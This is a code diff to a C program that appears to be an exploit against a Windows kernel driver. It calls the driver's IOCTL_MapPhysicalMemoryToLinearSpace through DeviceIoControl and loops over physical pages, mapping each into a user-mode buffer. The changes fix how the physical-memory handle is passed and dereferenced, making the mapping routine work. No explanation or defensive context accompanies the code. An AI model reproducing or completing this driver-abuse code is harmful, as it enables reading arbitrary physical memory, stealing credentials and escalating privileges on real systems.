@@ -51,14 +51,15 @@ int main(char argc, char** argv)
 		return FALSE;
 	}
 	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
-	status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, &hPhysicalMemory, sizeof(hPhysicalMemory), &hPhysicalMemory, sizeof(hPhysicalMemory), &bytesReturned, (LPOVERLAPPED)NULL);
+	status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, hPhysicalMemory, sizeof(hPhysicalMemory), 
+		hPhysicalMemory, sizeof(hPhysicalMemory), &bytesReturned, (LPOVERLAPPED)NULL);
 	if (status == FALSE) {
 		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %X\n", status);
 		return EXIT_FAILURE;
 	}
 	printf("[+] Called IOCTL_MapPhysicalMemoryToLinearSpace successfully. 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
 	printf("Handle for PhysicalMemory: 0x%p\n", hPhysicalMemory);
-
+	
 	PVOID* buf = (PVOID*)malloc(0x1000);
 	if (buf == 0) {
 		exit(EXIT_FAILURE);
@@ -71,7 +72,7 @@ int main(char argc, char** argv)
 		printf("%p - %p\n", (void*)start, (void*)end);
 
 		for (__int64 page = start; page < end; page = page + 0x1000) {
-			if (MapPhysicalMemory(hPhysicalMemory, page, 0x1000, buf) == FALSE) {
+			if (MapPhysicalMemory((HANDLE) *(PDWORD64)hPhysicalMemory, page, 0x1000, buf) == FALSE) {
 				fprintf(stderr, "[!] MapPhysicalMemory failed");
 				return EXIT_FAILURE;
 			}
@@ -90,8 +91,8 @@ int main(char argc, char** argv)
 	}
 
 	free(buf);
-
-	CloseHandle(hPhysicalMemory);
+	CloseHandle((HANDLE)*(PDWORD64)hPhysicalMemory);
 	CloseHandle(device);
 	return EXIT_SUCCESS;
+
 }
